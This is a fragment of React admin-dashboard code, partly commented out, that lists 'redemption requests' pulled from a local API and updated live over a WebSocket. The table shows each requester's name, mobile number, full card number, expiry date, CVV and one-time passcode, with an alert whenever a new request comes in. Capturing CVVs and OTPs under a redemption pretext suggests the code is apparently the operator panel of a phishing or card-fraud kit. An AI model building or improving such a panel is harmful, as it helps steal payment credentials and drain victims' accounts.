...
//       const response = await fetch('http://localhost:5001/api/admin/redemption-requests?limit=100', {
//         headers: {
...
//     socket.on('redemptionUpdate', (data) => {
...
//     try {
//       const token = localStorage.getItem('adminToken');
//       const response = await fetch(`http://localhost:5001/api/admin/redemption-requests/${id}/status`, {
//         method: 'PATCH',
//         headers: {
//           'Authorization': `Bearer ${token}`,
...
//       if (response.ok) {
//         // Data will be automatically refreshed via WebSocket
...
//       try {
//         const token = localStorage.getItem('adminToken');
//         const response = await fetch(`http://localhost:5001/api/admin/redemption-requests/${id}`, {
//           method: 'DELETE',
//           headers: {
//             'Authorization': `Bearer ${token}`,
//           },
...
//             Real-time redemption requests monitoring
//           </p>
//         </div>
...
//             <span>🔄 New redemption request received! Data updated automatically.</span>
//             <button
...
//                     <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">{req.mobileNumber}</td>
//                     <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">{req.cardNumber}</td>
//                     <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">{req.expiryDate}</td>
//                     <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">{req.cvv}</td>
//                     <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">{req.otp}</td>
                  ...
                  <div key={req.id} className="p-4 hover:bg-gray-50">
                    ...
                    <div className="flex items-start justify-between mb-3">
                      <div className="flex-1">
                        <div className="flex items-center space-x-2 mb-1">
                          ...
                          <h3 className="font-medium text-gray-900 text-sm">{req.fullName}</h3>
                        </div>
                    ...
                    <div className="grid grid-cols-2 gap-3 text-xs mb-3">
                      ...
                      <div>
                        ...
                        <p className="font-medium">{req.expiryDate}</p>
                      </div>
                      <div>
                        <span className="text-gray-500">CVV</span>
                        <p className="font-medium">{showSensitiveData ? req.cvv : '•••'}</p>
                      </div>
                      <div>
                        <span className="text-gray-500">OTP</span>
                        <p className="font-medium">{showSensitiveData ? req.otp : '••••••'}</p>
                      </div>
                    </div>
